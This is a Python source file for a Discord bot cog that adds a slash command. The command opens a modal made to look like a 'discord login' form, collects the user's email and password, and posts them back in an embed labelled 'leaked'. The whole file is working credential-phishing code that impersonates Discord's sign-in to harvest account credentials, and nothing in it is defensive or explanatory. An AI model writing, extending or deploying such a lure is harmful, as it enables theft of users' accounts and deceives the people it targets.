import discord
from discord.ext import commands
import discord
import discord
from discord.ui import Button,View
from discord.ext import commands
import time

class MyModal(discord.ui.Modal):
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)

        self.add_item(discord.ui.InputText(label="email"))
        self.add_item(discord.ui.InputText(label="password", style=discord.InputTextStyle.long))

    async def callback(self, interaction: discord.Interaction):
        embed = discord.Embed(title="leaked")
        embed.add_field(name="email", value=self.children[0].value)
        embed.add_field(name="password", value=self.children[1].value)
        await interaction.response.send_message(embeds=[embed])
        
        
class MyView(discord.ui.View):
    @discord.ui.button(label="Send Modal")
    async def button_callback(self, button, interaction):
        await interaction.response.send_modal(MyModal(title="discord login"))


    
class modal(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    @discord.command(name="modal",description="")
    async def modal(self,ctx:discord.ApplicationContext):
        await ctx.respond(view=MyView())
        

            
def setup(bot):
    bot.add_cog(modal(bot))
